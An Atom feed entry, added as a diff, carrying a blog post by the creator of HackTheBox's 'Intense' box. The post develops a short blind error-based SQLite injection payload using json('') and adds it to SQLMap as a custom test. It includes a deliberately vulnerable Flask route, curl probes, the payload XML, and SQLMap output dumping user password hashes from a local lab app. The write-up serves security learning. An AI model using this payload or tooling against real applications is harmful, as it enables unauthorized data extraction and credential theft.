@@ -1,0 +1,378 @@
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.2.2">Jekyll</generator><link href="https://example.com/feed.xml" rel="self" type="application/atom+xml" /><link href="https://example.com/" rel="alternate" type="text/html" /><updated>2023-08-24T12:03:03-04:00</updated><id>https://example.com/feed.xml</id><title type="html">LightSpeed</title><subtitle>A simple Jekyll theme</subtitle><author><name>tajacks</name></author><entry><title type="html">Implement a Blind Error-Based SQLMap payload for SQLite</title><link href="https://example.com/web/2023/08/24/implement-blind-sqlite-sqlmap.html" rel="alternate" type="text/html" title="Implement a Blind Error-Based SQLMap payload for SQLite" /><published>2023-08-24T00:00:00-04:00</published><updated>2023-08-24T00:00:00-04:00</updated><id>https://example.com/web/2023/08/24/implement-blind-sqlite-sqlmap</id><content type="html" xml:base="https://example.com/web/2023/08/24/implement-blind-sqlite-sqlmap.html"><![CDATA[<h2 id="context">Context</h2>
+
+<p>Back to year 2019, my first HackTheBox box <code class="language-plaintext highlighter-rouge">Intense</code> was released with several steps involved:</p>
+<ul>
+  <li>exploit a SQL injection for SQLite DMBS on the web application</li>
+  <li>use a hash length extension attack to login as admin on the web application</li>
+  <li>leak the SNMP config through a file disclure to get a shell on the underlying server</li>
+  <li>exploit an ELF binary to gain root access to the box</li>
+</ul>
+
+<p><br />
+The goal of this post is not to make a write-up of the box but to focus on the SQL injection part and how we can easily create
+new SQLMap payloads.</p>
+
+<p><br /></p>
+
+<h2 id="the-sql-injection">The SQL injection</h2>
+
+<p>When I created this challenge, I had in mind that the SQL injection should not be trivial and gets
+people to think about a new payload. So of course, SQLMap doesn’t work as its payloads are quite long.</p>
+
+<p><br /></p>
+
+<p>Here is the vulnerability in the Flask application:</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nd">@app.route</span><span class="p">(</span><span class="sh">"</span><span class="s">/submitmessage</span><span class="sh">"</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="sh">"</span><span class="s">POST</span><span class="sh">"</span><span class="p">])</span>
+<span class="k">def</span> <span class="nf">submitmessage</span><span class="p">():</span>
+    <span class="n">message</span> <span class="o">=</span> <span class="n">request</span><span class="p">.</span><span class="n">form</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">"</span><span class="s">message</span><span class="sh">"</span><span class="p">,</span> <span class="sh">''</span><span class="p">)</span>
+    <span class="k">if</span> <span class="nf">len</span><span class="p">(</span><span class="n">message</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">140</span><span class="p">:</span>
+        <span class="k">return</span> <span class="sh">"</span><span class="s">message too long</span><span class="sh">"</span>
+    <span class="k">if</span> <span class="nf">badword_in_str</span><span class="p">(</span><span class="n">message</span><span class="p">):</span>
+        <span class="k">return</span> <span class="sh">"</span><span class="s">forbidden word in message</span><span class="sh">"</span>
+    <span class="c1"># insert new message in DB
+</span>    <span class="k">try</span><span class="p">:</span>
+        <span class="nf">query_db</span><span class="p">(</span><span class="sh">"</span><span class="s">insert into messages values (</span><span class="sh">'</span><span class="s">%s</span><span class="sh">'</span><span class="s">)</span><span class="sh">"</span> <span class="o">%</span> <span class="n">message</span><span class="p">)</span>
+    <span class="k">except</span> <span class="n">sqlite3</span><span class="p">.</span><span class="n">Error</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
+        <span class="k">return</span> <span class="nf">str</span><span class="p">(</span><span class="n">e</span><span class="p">)</span>
+    <span class="k">return</span> <span class="sh">"</span><span class="s">OK</span><span class="sh">"</span>
+</code></pre></div></div>
+
+<p><br /></p>
+
+<p>The check on the message length was to limit users to use time-based SQL injection (spoiler alert: it didn’t work).</p>
+
+<p><br /></p>
+
+<p>As the goal of the blog post is to find a new payload which is more efficient than payload based on time, I removed the length check for the coming tests to help SQLMap.</p>
+
+<p><br /></p>
+
+<p>Now if we run SQLMap, it should identify a time-based blind payload:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;</span> python sqlmap.py <span class="nt">-u</span> http://127.0.0.1:5000/submitmessage <span class="nt">--data</span> <span class="s1">'message=a'</span> <span class="nt">-p</span> <span class="s1">'message'</span> <span class="nt">--dbms</span><span class="o">=</span>sqlite <span class="nt">--level</span> 5 <span class="nt">--risk</span> 3
+        ___
+       __H__
+ ___ ___[<span class="s2">"]_____ ___ ___  {1.7.8.8#dev}
+|_ -| . [,]     | .'| . |
+|___|_  [.]_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 13:10:17 /2023-08-24/
+
+[13:10:17] [INFO] testing connection to the target URL
+[13:10:17] [INFO] checking if the target is protected by some kind of WAF/IPS
+[13:10:17] [INFO] testing if the target URL content is stable
+[13:10:18] [INFO] target URL content is stable
+[13:10:18] [WARNING] heuristic (basic) test shows that POST parameter 'message' might not be injectable
+[13:10:18] [INFO] testing for SQL injection on POST parameter 'message'
+[13:10:18] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+[13:10:18] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
+[13:10:18] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'
+[...]
+[13:10:31] [INFO] POST parameter 'message' appears to be 'SQLite &gt; 2.0 AND time-based blind (heavy query)' injectable
+[...]
+</span></code></pre></div></div>
+
+<p><br /></p>
+
+<h2 id="exploitation-strategy">Exploitation strategy</h2>
+<p>SQL injections in INSERT clause are often error-based but to my knowledge, there is no SQLite function, by default, that allows us to leak raw information through an exception/error.</p>
+
+<p><br /></p>
+
+<p>When we submit a message on the web application, the string “OK” is returned when the message has been successfuly inserted or an exception is raised if an error occured:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;</span> curl http://127.0.0.1:5000/submitmessage <span class="nt">--data</span> <span class="s2">"message="</span>
+OK%
+
+<span class="o">&gt;</span> curl http://127.0.0.1:5000/submitmessage <span class="nt">--data</span> <span class="s2">"message='"</span>
+unrecognized token: <span class="s2">"''')"</span>%
+</code></pre></div></div>
+
+<p><br /></p>
+
+<p>Basic blind SQL payloads don’t work here:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&gt; curl http://127.0.0.1:5000/submitmessage --data "message=aaaa' and 1=1 and 'a'='a"
+OK%
+
+&gt; curl http://127.0.0.1:5000/submitmessage --data "message=aaaa' and 1=2 and 'a'='a"
+OK%
+</code></pre></div></div>
+
+<p><br /></p>
+
+<p>Our approach is to find a SQLite function that triggers one of the following behaviour:</p>
+<ul>
+  <li>servers returns the error in the header/body page</li>
+  <li>HTTP 500 status code</li>
+</ul>
+
+<p><br /></p>
+
+<p>The core of the injection will look like:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>' and case when 1=2 then 1 else function_to_find(xxx) end and 'a'='a -&gt; ERROR
+</code></pre></div></div>
+
+<p><br /></p>
+
+<h2 id="find-the-right-function">Find the right function</h2>
+
+<p>We will use two things:</p>
+<ul>
+  <li><a href="https://www.sqlite.org/lang_corefunc.html">SQLite documentation</a></li>
+  <li>SQLite interpreter, <code class="language-plaintext highlighter-rouge">sqlite3</code> in my Linux system</li>
+</ul>
+
+<p><br /></p>
+
+<p>SQLite has several core functions that you can find in the documentation.
+We may want to look for “logic vulnerable” functions/clause that compute integer:</p>
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">pow</code>, <code class="language-plaintext highlighter-rouge">exp</code> may create an integer overflow</li>
+  <li>division by 0 may create an error</li>
+</ul>
+
+<p><br />
+However, if we try them in the SQLite interpreter none of them raise an error:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sqlite&gt; select pow(999999,999999999999);
+Inf
+sqlite&gt; select exp(99999999);
+Inf
+sqlite&gt; select 1/0;
+
+sqlite&gt;
+</code></pre></div></div>
+
+<p><br /></p>
+
+<p>A solution is to look at every function and check what the doc says or by CTRL+F keywords such as <code class="language-plaintext highlighter-rouge">error</code>, <code class="language-plaintext highlighter-rouge">exception</code>, <code class="language-plaintext highlighter-rouge">raise</code>.</p>
+
+<p><br /></p>
+
+<p>Four years ago, I came up using the function <code class="language-plaintext highlighter-rouge">load_extension()</code> that loads a library (.so, .dll) on the disk. By default, loading extension is disabled and the function throws an error.</p>
+
+<p><br /></p>
+
+<p>On the interpreter</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sqlite&gt; select load_extension(0);
+Runtime error: 0.so: cannot open shared object file: No such file or directory
+</code></pre></div></div>
+
+<p><br /></p>
+
+<p>On the application</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&gt; curl http://127.0.0.1:5000/submitmessage --data "message=aaaa' and load_extension(0) and 'a'='a"
+not authorized%
+</code></pre></div></div>
+
+<p><br /></p>
+
+<p>And today, I looked back at the documentation if I could find other functions and decrease my SQLi payload length.</p>
+
+<p><br /></p>
+
+<p>In the math functions section, I noticed the <code class="language-plaintext highlighter-rouge">abs</code> function and the documentation says the function raises an integer overflow error if the integer argument is equal to <code class="language-plaintext highlighter-rouge">-9223372036854775808</code>.</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sqlite&gt; select abs(-9223372036854775808);
+Runtime error: integer overflow
+</code></pre></div></div>
+
+<p><br /></p>
+
+<p>In the json section, the documentation says that every json functions raise an error if the text value is not a well-formed JSON object. Quite similar to the <code class="language-plaintext highlighter-rouge">UPDATEXML</code> or <code class="language-plaintext highlighter-rouge">EXTRACTVALUE</code> MySQL functions.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sqlite&gt; select json('');
+Runtime error: malformed JSON
+</code></pre></div></div>
+
+<p><br /></p>
+
+<h2 id="exploitation">Exploitation</h2>
+
+<p>Using <code class="language-plaintext highlighter-rouge">load_extension</code> or <code class="language-plaintext highlighter-rouge">abs</code> is possible but <code class="language-plaintext highlighter-rouge">json</code> function is the shortest.</p>
+
+<table>
+  <thead>
+    <tr>
+      <th>Function</th>
+      <th>   Length</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>load_extension(0)</td>
+      <td>   17</td>
+    </tr>
+    <tr>
+      <td>abs(-9223372036854775808)</td>
+      <td>   25</td>
+    </tr>
+    <tr>
+      <td>json(‘’)</td>
+      <td>   8</td>
+    </tr>
+  </tbody>
+</table>
+
+<p><br /></p>
+
+<p>Our payload is the following:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>' and case when 1=2 then 1 else json('') end and 'a'='a
+</code></pre></div></div>
+
+<p><br /></p>
+
+<p>And the result:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;</span> curl http://127.0.0.1:5000/submitmessage <span class="nt">--data</span> <span class="s2">"message=' and case when 1=1 then 1 else json('') end and 'a'='a"</span>         
+OK%
+
+<span class="o">&gt;</span> curl http://127.0.0.1:5000/submitmessage <span class="nt">--data</span> <span class="s2">"message=' and case when 1=2 then 1 else json('') end and 'a'='a"</span>
+malformed JSON%
+</code></pre></div></div>
+
+<p><br /></p>
+
+<h2 id="implement-our-new-payload-in-sqlmap">Implement our new payload in SQLMap</h2>
+
+<p>Now we have a working and efficient payload, we can implement it in SQLMap:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;</span> git clone https://github.com/sqlmapproject/sqlmap
+<span class="o">&gt;</span> <span class="nb">cd </span>sqlmap
+</code></pre></div></div>
+
+<p><br /></p>
+
+<p>Add the following at the end of the file <code class="language-plaintext highlighter-rouge">data/xml/payloads/boolean_blind.xml</code>:</p>
+
+<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;test&gt;</span>
+    <span class="nt">&lt;title&gt;</span>SQLite boolean-based blind<span class="nt">&lt;/title&gt;</span>
+    <span class="nt">&lt;stype&gt;</span>1<span class="nt">&lt;/stype&gt;</span> <span class="c">&lt;!-- Injection type (Boolean, Error-based, ...) --&gt;</span>
+    <span class="nt">&lt;level&gt;</span>1<span class="nt">&lt;/level&gt;</span> <span class="c">&lt;!-- When the test should be performed (1=Always) --&gt;</span>
+    <span class="nt">&lt;risk&gt;</span>1<span class="nt">&lt;/risk&gt;</span> <span class="c">&lt;!-- Damage risk of the payload --&gt;</span>
+    <span class="nt">&lt;clause&gt;</span>1<span class="nt">&lt;/clause&gt;</span> <span class="c">&lt;!-- Clause to inject (WHERE, GROUP BY, ...) --&gt;</span>
+    <span class="nt">&lt;where&gt;</span>1<span class="nt">&lt;/where&gt;</span> <span class="c">&lt;!-- Where the payload should be inserted --&gt;</span>
+    <span class="c">&lt;!-- [INFERENCE] SQLMap will insert the payload to extract data --&gt;</span>
+    <span class="nt">&lt;vector&gt;</span>AND CASE WHEN [INFERENCE] THEN 1 ELSE json('') END <span class="nt">&lt;/vector&gt;</span> 
+    <span class="nt">&lt;request&gt;</span>
+    <span class="c">&lt;!-- Check for the vuln, should returns 1 --&gt;</span>
+        <span class="nt">&lt;payload&gt;</span>AND CASE WHEN [RANDNUM]=[RANDNUM] THEN 1 ELSE json('') END<span class="nt">&lt;/payload&gt;</span> 
+    <span class="nt">&lt;/request&gt;</span>
+    <span class="nt">&lt;response&gt;</span>
+        <span class="c">&lt;!-- 2nd check for the vuln, should raise the error --&gt;</span>
+        <span class="nt">&lt;comparison&gt;</span>AND CASE WHEN [RANDNUM]=[RANDNUM1] THEN 1 ELSE json('') END<span class="nt">&lt;/comparison&gt;</span>
+    <span class="nt">&lt;/response&gt;</span>
+    <span class="nt">&lt;details&gt;</span>
+        <span class="nt">&lt;dbms&gt;</span>SQLite<span class="nt">&lt;/dbms&gt;</span>
+    <span class="nt">&lt;/details&gt;</span>
+<span class="nt">&lt;/test&gt;</span>
+</code></pre></div></div>
+
+<p><br /></p>
+
+<p>If we run SQLMap it should find the injection:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;</span> python sqlmap.py <span class="nt">-u</span> http://127.0.0.1:5000/submitmessage <span class="nt">--data</span> <span class="s1">'message=a'</span> <span class="nt">-p</span> <span class="s1">'message'</span> <span class="nt">--dbms</span><span class="o">=</span>sqlite
+
+<span class="o">[</span>...]
+
+<span class="o">[</span>13:18:56] <span class="o">[</span>INFO] testing connection to the target URL
+<span class="o">[</span>13:18:56] <span class="o">[</span>INFO] testing <span class="k">if </span>the target URL content is stable
+<span class="o">[</span>13:18:56] <span class="o">[</span>INFO] target URL content is stable
+<span class="o">[</span>13:18:56] <span class="o">[</span>WARNING] heuristic <span class="o">(</span>basic<span class="o">)</span> <span class="nb">test </span>shows that POST parameter <span class="s1">'message'</span> might not be injectable
+<span class="o">[</span>13:18:56] <span class="o">[</span>INFO] testing <span class="k">for </span>SQL injection on POST parameter <span class="s1">'message'</span>
+<span class="o">[</span>13:18:56] <span class="o">[</span>INFO] testing <span class="s1">'AND boolean-based blind - WHERE or HAVING clause'</span>
+<span class="o">[</span>13:18:56] <span class="o">[</span>INFO] testing <span class="s1">'Boolean-based blind - Parameter replace (original value)'</span>
+<span class="o">[</span>13:18:56] <span class="o">[</span>INFO] testing <span class="s1">'Generic inline queries'</span>
+<span class="o">[</span>13:18:56] <span class="o">[</span>INFO] testing <span class="s1">'SQLite boolean-based blind'</span>
+<span class="o">[</span>13:18:57] <span class="o">[</span>INFO] POST parameter <span class="s1">'message'</span> appears to be <span class="s1">'SQLite boolean-based blind'</span> injectable 
+<span class="k">for </span>the remaining tests, <span class="k">do </span>you want to include all tests <span class="k">for</span> <span class="s1">'SQLite'</span> extending provided level <span class="o">(</span>1<span class="o">)</span> and risk <span class="o">(</span>1<span class="o">)</span> values? <span class="o">[</span>Y/n] n
+<span class="o">[</span>13:19:02] <span class="o">[</span>INFO] testing <span class="s1">'Generic UNION query (NULL) - 1 to 20 columns'</span>
+<span class="o">[</span>13:19:02] <span class="o">[</span>INFO] automatically extending ranges <span class="k">for </span>UNION query injection technique tests as there is at least one other <span class="o">(</span>potential<span class="o">)</span> technique found
+<span class="o">[</span>13:19:02] <span class="o">[</span>INFO] checking <span class="k">if </span>the injection point on POST parameter <span class="s1">'message'</span> is a <span class="nb">false </span>positive
+POST parameter <span class="s1">'message'</span> is vulnerable. Do you want to keep testing the others <span class="o">(</span><span class="k">if </span>any<span class="o">)</span>? <span class="o">[</span>y/N] N
+sqlmap identified the following injection point<span class="o">(</span>s<span class="o">)</span> with a total of 46 HTTP<span class="o">(</span>s<span class="o">)</span> requests:
+<span class="nt">---</span>
+Parameter: message <span class="o">(</span>POST<span class="o">)</span>
+    Type: boolean-based blind
+    Title: SQLite boolean-based blind
+    Payload: <span class="nv">message</span><span class="o">=</span>a<span class="s1">' AND CASE WHEN 6418=6418 THEN 1 ELSE json('') END AND '</span>EDIB<span class="s1">'='</span>EDIB
+
+</code></pre></div></div>
+
+<p><br /></p>
+
+<p>As the new payload with the function <code class="language-plaintext highlighter-rouge">json</code> is shorter than my initial <code class="language-plaintext highlighter-rouge">load_extension</code> method, the length check in <code class="language-plaintext highlighter-rouge">app.py</code> can be put back and it still works.</p>
+
+<p><br /></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;</span> python sqlmap.py <span class="nt">-u</span> http://127.0.0.1:5000/submitmessage <span class="nt">--data</span> <span class="s1">'message=a'</span> <span class="nt">-p</span> <span class="s1">'message'</span> <span class="nt">--dbms</span><span class="o">=</span>sqlite <span class="nt">--tables</span>
+
+<span class="o">[</span>...]
+
+sqlmap resumed the following injection point<span class="o">(</span>s<span class="o">)</span> from stored session:
+<span class="nt">---</span>                                                   
+Parameter: message <span class="o">(</span>POST<span class="o">)</span>                                                                                              
+    Type: boolean-based blind
+    Title: SQLite boolean-based blind
+    Payload: <span class="nv">message</span><span class="o">=</span>a<span class="s1">' AND CASE WHEN 6418=6418 THEN 1 ELSE json('') END AND '</span>EDIB<span class="s1">'='</span>EDIB
+<span class="nt">---</span>                                  
+<span class="o">[</span>13:20:44] <span class="o">[</span>INFO] testing SQLite                                                                                       
+<span class="o">[</span>13:20:44] <span class="o">[</span>INFO] confirming SQLite
+<span class="o">[</span>13:20:44] <span class="o">[</span>INFO] actively fingerprinting SQLite
+<span class="o">[</span>13:20:44] <span class="o">[</span>INFO] the back-end DBMS is SQLite
+back-end DBMS: SQLite                           
+<span class="o">[</span>13:20:44] <span class="o">[</span>INFO] fetching tables <span class="k">for </span>database: <span class="s1">'SQLite_masterdb'</span>
+<span class="o">[</span>13:20:44] <span class="o">[</span>INFO] fetching number of tables <span class="k">for </span>database <span class="s1">'SQLite_masterdb'</span>
+<span class="o">[</span>13:20:44] <span class="o">[</span>WARNING] running <span class="k">in </span>a single-thread mode. Please consider usage of option <span class="s1">'--threads'</span> <span class="k">for </span>faster data retrieval
+<span class="o">[</span>13:20:44] <span class="o">[</span>INFO] retrieved: 2                                                                                         
+<span class="o">[</span>13:20:44] <span class="o">[</span>INFO] retrieved: <span class="nb">users</span>                  
+<span class="o">[</span>13:20:44] <span class="o">[</span>INFO] retrieved: messages                                                                                  
+&lt;current&gt;                     
+<span class="o">[</span>2 tables]                    
++----------+                                                                                                           
+| messages |                      
+| <span class="nb">users</span>    |                  
++----------+
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;</span> python sqlmap.py <span class="nt">-u</span> http://127.0.0.1:5000/submitmessage <span class="nt">--data</span> <span class="s1">'message=a'</span> <span class="nt">-p</span> <span class="s1">'message'</span> <span class="nt">--dbms</span><span class="o">=</span>sqlite <span class="nt">-T</span> <span class="nb">users</span> <span class="nt">--dump</span>
+
+<span class="o">[</span>...]
+
+sqlmap resumed the following injection point<span class="o">(</span>s<span class="o">)</span> from stored session:
+<span class="nt">---</span>
+Parameter: message <span class="o">(</span>POST<span class="o">)</span>
+    Type: boolean-based blind
+    Title: SQLite boolean-based blind
+    Payload: <span class="nv">message</span><span class="o">=</span>a<span class="s1">' AND CASE WHEN 6418=6418 THEN 1 ELSE json('') END AND '</span>EDIB<span class="s1">'='</span>EDIB
+<span class="nt">---</span>
+
+<span class="o">[</span>...]
+
+<span class="o">[</span>13:21:04] <span class="o">[</span>INFO] retrieved: CREATE TABLE <span class="nb">users</span><span class="o">(</span>username varchar<span class="o">(</span>20<span class="o">)</span>, secret varchar<span class="o">(</span>200<span class="o">)</span>, role INT<span class="o">)</span>
+<span class="o">[</span>13:21:06] <span class="o">[</span>INFO] fetching entries <span class="k">for </span>table <span class="s1">'users'</span>
+<span class="o">[</span>13:21:06] <span class="o">[</span>INFO] fetching number of entries <span class="k">for </span>table <span class="s1">'users'</span> <span class="k">in </span>database <span class="s1">'SQLite_masterdb'</span>
+<span class="o">[</span>13:21:06] <span class="o">[</span>INFO] retrieved: 2
+<span class="o">[</span>13:21:06] <span class="o">[</span>INFO] retrieved: 1
+<span class="o">[</span>13:21:06] <span class="o">[</span>INFO] retrieved: f1fc12010c094016def791e1435ddfdcaeccf8250e36630c0bc93285c2971105
+<span class="o">[</span>13:21:07] <span class="o">[</span>INFO] retrieved: admin
+<span class="o">[</span>13:21:07] <span class="o">[</span>INFO] retrieved: 0
+<span class="o">[</span>13:21:07] <span class="o">[</span>INFO] retrieved: 84983c60f7daadc1cb8698621f802c0d9f9a3c3c295c810748fb048115c186ec
+<span class="o">[</span>13:21:08] <span class="o">[</span>INFO] retrieved: guest
+<span class="o">[</span>13:21:08] <span class="o">[</span>INFO] recognized possible password hashes <span class="k">in </span>column <span class="s1">'secret'</span>
+<span class="k">do </span>you want to store hashes to a temporary file <span class="k">for </span>eventual further processing with other tools <span class="o">[</span>y/N] N
+<span class="k">do </span>you want to crack them via a dictionary-based attack? <span class="o">[</span>Y/n/q] n
+Database: &lt;current&gt;
+Table: <span class="nb">users</span>
+<span class="o">[</span>2 entries]
++------+------------------------------------------------------------------+----------+
+| role | secret                                                           | username |
++------+------------------------------------------------------------------+----------+
+| 1    | f1fc12010c094016def791e1435ddfdcaeccf8250e36630c0bc93285c2971105 | admin    |
+| 0    | 84983c60f7daadc1cb8698621f802c0d9f9a3c3c295c810748fb048115c186ec | guest    |
++------+------------------------------------------------------------------+----------+
+
+</code></pre></div></div>]]></content><author><name>soka</name></author><category term="web" /><summary type="html"><![CDATA[Context]]></summary></entry></feed>
